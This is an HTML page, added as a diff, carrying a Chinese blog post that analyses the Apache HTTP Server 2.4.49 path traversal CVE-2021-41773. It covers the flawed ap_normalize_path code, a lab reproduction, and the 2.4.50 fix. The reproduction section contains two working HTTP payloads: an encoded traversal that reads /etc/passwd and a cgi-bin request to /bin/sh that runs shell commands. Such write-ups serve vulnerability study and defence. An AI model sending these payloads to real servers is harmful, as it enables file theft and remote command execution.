@@ -1,0 +1,1273 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Apache HTTP Server 2.4.49 路径穿越漏洞 CVE-2021-41773, hybcx&#39;s blog">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Apache HTTP Server 2.4.49 路径穿越漏洞 CVE-2021-41773 | hybcx&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">hybcx&#39;s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">hybcx&#39;s blog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Apache HTTP Server 2.4.49 路径穿越漏洞 CVE-2021-41773</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CVE/">
+                                <span class="chip bg-color">CVE</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CVE%E6%BC%8F%E6%B4%9E/" class="post-category">
+                                CVE漏洞
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-09-16
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="0x01-漏洞概述">0x01 漏洞概述</h2>
+<p>Apache HTTP Server（简称 Apache）是开源的 Web 服务器，可以在大多数计算机操作系统中运行，由于其多平台和安全性被广泛使用，是最流行的 Web 服务器端软件之一。它快速、可靠并且可通过简单的 API 扩展，将 Perl/Python 等解释器编译到服务器中。</p>
+<p>Apache 披露了一个在 Apache HTTP Server 2.4.49 上引入的漏洞，称为 CVE-2021-41773。同时发布了2.4.50更新，修复了这个漏洞。该漏洞允许攻击者绕过路径遍历保护，使用编码并读取网络服务器文件系统上的任意文件。运行此版本 Apache 的 Linux 和 Windows 服务器都受到影响。此漏洞是在 2.4.49 中引入的，该补丁旨在提高 URL 验证的性能。可以通过对“.”进行编码来绕过新的验证方法。</p>
+<p>该漏洞仅影响2.4.49版本，此外还需要在配置文件中允许访问穿越的目录，如<code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code>，使用默认配置的Apache HTTP Server不受影响。</p>
+<p>在服务器开启cgi或cgid模块的情况下，该漏洞可执行任意命令。</p>
+<h2 id="0x02-漏洞成因">0x02 漏洞成因</h2>
+<p>Apache HTTP Server 2.4.49版本使用的ap_normalize_path函数在对路径做过滤的时候没有过滤干净。</p>
+<p>ap_normalize_path函数如下</p>
+<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Inspired by mod_jk's jk_servlet_normalize().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">AP_DECLARE</span>(<span class="hljs-type">int</span>) <span class="hljs-built_in">ap_normalize_path</span>(<span class="hljs-type">char</span> *path, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)<br>{<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">apr_size_t</span> l = <span class="hljs-number">1</span>, w = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">IS_SLASH</span>(path[<span class="hljs-number">0</span>])) {<br>        <span class="hljs-comment">/* Besides "OPTIONS *", a request-target should start with '/'</span><br><span class="hljs-comment">         * per RFC 7230 section 5.3, so anything else is invalid.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (path[<span class="hljs-number">0</span>] == <span class="hljs-string">'*'</span> &amp;&amp; path[<span class="hljs-number">1</span>] == <span class="hljs-string">'\0'</span>) {<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        }<br>        <span class="hljs-comment">/* However, AP_NORMALIZE_ALLOW_RELATIVE can be used to bypass</span><br><span class="hljs-comment">         * this restriction (e.g. for subrequest file lookups).</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (!(flags &amp; AP_NORMALIZE_ALLOW_RELATIVE) || path[<span class="hljs-number">0</span>] == <span class="hljs-string">'\0'</span>) {<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        }<br><br>        l = w = <span class="hljs-number">0</span>;<br>    }<br><br>    <span class="hljs-comment">// 遍历路径字符串，一边做url解码一边检测 '..'，出现漏洞。</span><br>    <span class="hljs-keyword">while</span> (path[l] != <span class="hljs-string">'\0'</span>) {<br>        <span class="hljs-comment">/* RFC-3986 section 2.3:</span><br><span class="hljs-comment">         *  For consistency, percent-encoded octets in the ranges of</span><br><span class="hljs-comment">         *  ALPHA (%41-%5A and %61-%7A), DIGIT (%30-%39), hyphen (%2D),</span><br><span class="hljs-comment">         *  period (%2E), underscore (%5F), or tilde (%7E) should [...]</span><br><span class="hljs-comment">         *  be decoded to their corresponding unreserved characters by</span><br><span class="hljs-comment">         *  URI normalizers.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// 这一段是在做URL解码</span><br>        <span class="hljs-comment">// 检测到当前位为‘%’，接下来两位为十六进制数字就进入if</span><br>        <span class="hljs-keyword">if</span> ((flags &amp; AP_NORMALIZE_DECODE_UNRESERVED)<br>                &amp;&amp; path[l] == <span class="hljs-string">'%'</span> &amp;&amp; <span class="hljs-built_in">apr_isxdigit</span>(path[l + <span class="hljs-number">1</span>])<br>                                  &amp;&amp; <span class="hljs-built_in">apr_isxdigit</span>(path[l + <span class="hljs-number">2</span>])) {<br>            <span class="hljs-type">const</span> <span class="hljs-type">char</span> c = <span class="hljs-built_in">x2c</span>(&amp;path[l + <span class="hljs-number">1</span>]); <span class="hljs-comment">// 将url编码转换为字符（16进制转char）</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">apr_isalnum</span>(c) || (c &amp;&amp; <span class="hljs-built_in">strchr</span>(<span class="hljs-string">"-._~"</span>, c))) {<br>                <span class="hljs-comment">/* Replace last char and fall through as the current</span><br><span class="hljs-comment">                 * read position */</span><br>                l += <span class="hljs-number">2</span>;<br>                path[l] = c;<br>            }<br>        }<br><br>        <span class="hljs-keyword">if</span> ((flags &amp; AP_NORMALIZE_DROP_PARAMETERS) &amp;&amp; path[l] == <span class="hljs-string">';'</span>) {<br>            <span class="hljs-keyword">do</span> {<br>                l++;<br>            } <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">IS_SLASH_OR_NUL</span>(path[l]));<br>            <span class="hljs-keyword">continue</span>;<br>        }<br><br>        <span class="hljs-comment">// 如果path[0]不是斜杠，且不是* 或者空串，w就会置为0。</span><br>        <span class="hljs-comment">// 如果w = 0 或者 paht[0]是斜杠，就进入循环。</span><br>        <span class="hljs-keyword">if</span> (w == <span class="hljs-number">0</span> || <span class="hljs-built_in">IS_SLASH</span>(path[w - <span class="hljs-number">1</span>])) {<br>            <span class="hljs-comment">/* Collapse ///// sequences to / */</span><br>            <span class="hljs-comment">//跳过连续的斜杠</span><br>            <span class="hljs-keyword">if</span> ((flags &amp; AP_NORMALIZE_MERGE_SLASHES) &amp;&amp; <span class="hljs-built_in">IS_SLASH</span>(path[l])) {<br>                <span class="hljs-keyword">do</span> {<br>                    l++;<br>                } <span class="hljs-keyword">while</span> (<span class="hljs-built_in">IS_SLASH</span>(path[l]));<br>                <span class="hljs-keyword">continue</span>;<br>            }<br>            <span class="hljs-comment">//如果检测到点号</span><br>            <span class="hljs-keyword">if</span> (path[l] == <span class="hljs-string">'.'</span>) {<br>                <span class="hljs-comment">/* Remove /./ segments */</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_SLASH_OR_NUL</span>(path[l + <span class="hljs-number">1</span>])) {<br>                    l++;<br>                    <span class="hljs-keyword">if</span> (path[l]) {<br>                        l++;<br>                    }<br>                    <span class="hljs-keyword">continue</span>;<br>                }<br><br>                <span class="hljs-comment">/* Remove /xx/../ segments */</span><br>                <span class="hljs-comment">// 如果点号的下一个还是点号，就要删一点了</span><br>                <span class="hljs-keyword">if</span> (path[l + <span class="hljs-number">1</span>] == <span class="hljs-string">'.'</span> &amp;&amp; <span class="hljs-built_in">IS_SLASH_OR_NUL</span>(path[l + <span class="hljs-number">2</span>])) {<br>                    <span class="hljs-comment">/* Wind w back to remove the previous segment */</span><br>                    <span class="hljs-keyword">if</span> (w &gt; <span class="hljs-number">1</span>) {<br>                        <span class="hljs-keyword">do</span> {<br>                            w--;<br>                        } <span class="hljs-keyword">while</span> (w &amp;&amp; !<span class="hljs-built_in">IS_SLASH</span>(path[w - <span class="hljs-number">1</span>]));<br>                    }<br>                    <span class="hljs-keyword">else</span> {<br>                        <span class="hljs-comment">/* Already at root, ignore and return a failure</span><br><span class="hljs-comment">                         * if asked to.</span><br><span class="hljs-comment">                         */</span><br>                        <span class="hljs-keyword">if</span> (flags &amp; AP_NORMALIZE_NOT_ABOVE_ROOT) {<br>                            ret = <span class="hljs-number">0</span>;<br>                        }<br>                    }<br><br>                    <span class="hljs-comment">/* Move l forward to the next segment */</span><br>                    l += <span class="hljs-number">2</span>;<br>                    <span class="hljs-keyword">if</span> (path[l]) {<br>                        l++;<br>                    }<br>                    <span class="hljs-keyword">continue</span>;<br>                }<br>            }<br>        }<br><br>        path[w++] = path[l++];<br>    }<br>    path[w] = <span class="hljs-string">'\0'</span>;<br><br>    <span class="hljs-keyword">return</span> ret;<br>}<br></code></pre></td></tr></tbody></table></figure>
+<p>可以看到，漏洞的产生原因是其遍历一整个路径字符串，对每一位，先进行url解码，然后检测是不是当前位和下一位的组合是不是两个点<code>..</code><br>
+他能检测出的情况如下</p>
+<figure class="highlight erlang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang">..<br><span class="hljs-comment">%2e.    // 正在处理第一位，解码后发现是..组合</span><br></code></pre></td></tr></tbody></table></figure>
+<p>然而如果遇到这种情况</p>
+<figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">.%2e    // 解码第一位，仍然是.%2e，没有检测到..组合<br>%<span class="hljs-number">2</span>e%2e  // 解码第一位，解成.%2e，仍然无法检测到..组合<br></code></pre></td></tr></tbody></table></figure>
+<h2 id="0x03-漏洞复现">0x03 漏洞复现</h2>
+<p>启动后，访问环境ip 8080端口看到“It Works!”表明环境启动成功</p>
+<p>发送以下payload成功读取<code>/etc/passwd</code>文件</p>
+<blockquote>
+<p>/icons/目录是一个存在且可访问的目录，测试时也可改为其他目录如/cgi-bin/，但在本环境中/cgi-bin/目录访问状态码为403，因此使用了/icons/目录</p>
+</blockquote>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http">GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd <br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.26.103:8080<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></tbody></table></figure>
+<p>![image-20230916163701796](Apache HTTP Server 2.4.49 路径穿越漏洞/image-20230916163701796.png)</p>
+<p><strong>执行命令</strong></p>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http">POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh <br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.26.103:8080<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>46<br><br>echo Content-Type: text/plain; echo; id; uname<br></code></pre></td></tr></tbody></table></figure>
+<p>![image-20230916163905857](Apache HTTP Server 2.4.49 路径穿越漏洞/image-20230916163905857.png)</p>
+<h2 id="0x04-漏洞修复">0x04  漏洞修复</h2>
+<p>1）41773——2.4.50版本对<code>ap_normalize_path</code>函数进行修改，补充了如下代码，对<code>.%2e</code>的绕过形式进行了判断，可以避免使用该方法绕过。</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((path[n] == <span class="hljs-string">'.'</span> || (decode_unreserved<br>    &amp;&amp; path[n] == <span class="hljs-string">'%'</span><br>    &amp;&amp; path[++n] == <span class="hljs-string">'2'</span><br>    &amp;&amp; (path[++n] == <span class="hljs-string">'e'</span><br>    || path[n] == <span class="hljs-string">'E'</span>)))<br>    &amp;&amp; <span class="hljs-title function_ invoke__">IS_SLASH_OR_NUL</span>(path[n + <span class="hljs-number">1</span>])) {<br>    <span class="hljs-comment">/* Wind w back to remove the previous segment */</span><br>    <span class="hljs-keyword">if</span> (w &gt; <span class="hljs-number">1</span>) {<br>        <span class="hljs-keyword">do</span> {<br>            w--;<br>        } <span class="hljs-keyword">while</span> (w &amp;&amp; !<span class="hljs-title function_ invoke__">IS_SLASH</span>(path[w - <span class="hljs-number">1</span>]));<br>    }<br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-comment">/* Already at root, ignore and return a failure</span><br><span class="hljs-comment">            * if asked to.</span><br><span class="hljs-comment">            */</span><br>        <span class="hljs-keyword">if</span> (flags &amp; AP_NORMALIZE_NOT_ABOVE_ROOT) {<br>            ret = <span class="hljs-number">0</span>;<br>        }<br>    }<br>    <span class="hljs-comment">/* Move l forward to the next segment */</span><br>    l = n + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (path[l]) {<br>        l++;<br>    }<br>    <span class="hljs-keyword">continue</span>;<br>}&lt;br&gt;————https:<span class="hljs-comment">//xz.aliyun.com/t/10359?page=1</span><br></code></pre></td></tr></tbody></table></figure>
